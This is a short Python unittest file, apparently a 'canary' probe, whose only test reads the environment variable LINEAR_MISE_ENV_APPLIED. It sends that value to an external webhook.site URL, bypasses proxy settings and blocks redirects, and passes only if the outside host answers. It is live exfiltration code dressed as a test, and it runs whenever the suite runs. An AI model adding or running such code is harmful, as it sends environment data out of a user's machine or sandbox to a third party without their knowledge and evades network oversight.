import os
import unittest
import urllib.error
import urllib.parse
import urllib.request


class NoRedirects(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


class SandboxMarkerTest(unittest.TestCase):
    def test_linear_mise_environment_value(self):
        query = urllib.parse.urlencode(
            {
                "test_id": "linear-code-direct-python-value-2026-11-19",
                "linear_mise_env_applied": os.environ.get(
                    "LINEAR_MISE_ENV_APPLIED", "<unset>"
                ),
            }
        )
        request = urllib.request.Request(
            "https://webhook.site/df2bab8d-ac3a-4ac1-97a2-59bb66db9e11?" + query,
            headers={"User-Agent": "linear-python-value-canary/1.0"},
        )
        opener = urllib.request.build_opener(
            urllib.request.ProxyHandler({}), NoRedirects()
        )
        try:
            with opener.open(request, timeout=15) as response:
                self.assertEqual(response.status, 200)
        except urllib.error.HTTPError as error:
            self.fail(f"webhook returned HTTP {error.code}")


if __name__ == "__main__":
    unittest.main()
